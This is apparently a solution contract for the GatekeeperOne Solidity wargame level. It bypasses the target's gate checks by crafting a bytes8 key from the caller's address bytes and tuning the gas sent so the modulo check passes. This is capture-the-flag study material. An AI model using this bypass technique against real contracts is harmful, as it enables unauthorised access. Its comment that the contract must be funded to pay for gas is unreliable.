pragma solidity ^0.6.0;

interface IGatekeeperOne {

    function enter(bytes8 _gateKey) external returns(bool);
}

contract GatekeeperHack{

    function hackGate(address instance, uint256 gasV, bytes8 gateKey) public {
        IGatekeeperOne gate = IGatekeeperOne(instance);

        // gateThree
        // partOne:
            // latest 2 bytes from key should be eq to latest 4 bytes
            // 0xXXXXXXXX00006ca6
        // partTwo:
            // latest 4 bytes from key should be different than all 8 bytes
            // 0x0101010100000000
        // partThree :
            // latest 2 bytes from origin should be eq to the latest 4 from key
            // 0x0101010100006ca6

        // bytes8 gateKey = 0x0101010100006CA6
        // it can change depending on what tx.origin you use (replace latest 2 bytes with
        // your tx.origin latest 2 bytes)

        gate.enter{gas:gasV}(gateKey); // call with 41209 gas in order to be enough for SSTORE (20k gas) and to have gasleft divisible by 8191 at opcode DUP2, right after GAS opcode
        // Be careful to fund the contract before calling hackGate; calling another contract from this one
        // requires gas.
        // When checking the gasleft() on the debugger always check the opCode after GAS
        // Debug always with the original contract (changing .mod to % will lead to other gas fee)
    }

    receive() external payable{

    }
}
